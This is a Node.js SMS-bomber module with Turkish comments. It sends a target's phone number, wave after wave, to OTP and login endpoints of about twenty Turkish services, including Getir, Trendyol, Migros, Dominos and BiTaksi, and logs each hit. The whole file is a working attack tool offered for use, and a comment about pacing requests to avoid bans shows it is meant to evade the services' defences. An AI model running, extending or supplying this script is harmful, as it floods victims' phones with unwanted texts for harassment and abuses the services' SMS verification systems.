const request = require('request');
const chalk = require('chalk');

const headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json'
};

// Hata yönetimli ateşleme sistemi
async function fire(url, data, label) {
    request.post({ url, headers, json: data, timeout: 5000 }, (err, res, body) => {
        if (!err && res && res.statusCode >= 200 && res.statusCode < 300) {
            console.log(chalk.green(`[+] ${label}: HIT`));
        } else {
            // Hata olsa bile sistemi durdurmaz, sadece log basar
            console.log(chalk.red(`[-] ${label}: FAIL`));
        }
    });
}

async function smsBomber(no, amount) {
    const full = "90" + no;

    for (let i = 0; i < amount; i++) {
        console.log(chalk.cyan(`\n[!] Dalga ${i + 1} Başlatıldı...`));

        // --- YEMEK & MARKET ---
        fire("https://api.getir.com/v1/auth/otp", { "phone": full }, "Getir");
        fire("https://api.yemeksepeti.com/v1/user/otp", { "phone": no }, "Yemeksepeti");
        fire("https://api-gateway.migros.com.tr/membership-service/v1/otp/send", { "phoneNumber": no }, "Migros");
        fire("https://www.tiklagelsin.com/api/user/login", { "phone": no }, "TiklaGelsin");
        fire("https://pizzalazz.com.tr/api/login/send-otp", { "phone": no }, "PizzaLazz");
        fire("https://api.istegelsin.com/v1/user/otp", { "phoneNumber": full }, "IsteGelsin");
        fire("https://www.dominos.com.tr/api/as/v1/customer/login/otp", { "phone": no }, "Dominos");
        fire("https://www.pasaportpizza.com/api/v1/auth/otp", { "phone": no }, "PasaportPizza");

        // --- ALIŞVERİŞ & MODA ---
        fire("https://api.trendyol.com/sapigw/membership/otp/send", { "phone": no }, "Trendyol");
        fire("https://www.lcwaikiki.com/tr-TR/TR/login/send-otp", { "phone": no }, "LCW");
        fire("https://www.defacto.com.tr/customer/send-otp", { "phone": no }, "DeFacto");
        fire("https://api.modanisa.com/v1/user/otp", { "phone": no }, "Modanisa");
        fire("https://www.boyner.com.tr/api/v1/auth/otp", { "phone": no }, "Boyner");
        fire("https://www.flo.com.tr/api/v1/auth/otp", { "phone": no }, "Flo");
        fire("https://www.ebebek.com/api/v1/auth/otp", { "phone": no }, "Ebebek");

        // --- DİĞER SERVİSLER ---
        fire("https://www.letgo.com/api/v1/auth/otp", { "phone": no }, "Letgo");
        fire("https://api.taksi.com/v1/login/otp", { "phone": no }, "BiTaksi");
        fire("https://www.hopishop.com/api/v1/auth/otp", { "phone": no }, "Hopi");
        fire("https://www.marti.tech/api/v1/auth/otp", { "phone": no }, "Marti");
        fire("https://www.binbin.tech/api/v1/auth/otp", { "phone": no }, "BinBin");
        fire("https://www.tazefikir.com/api/otp", { "phone": no }, "Tazefikir");

        // Ban yememek ve Termux'u kasmamak için her tur arası 2 saniye bekleme
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
}

// index.js ile tam uyum için
module.exports = smsBomber;
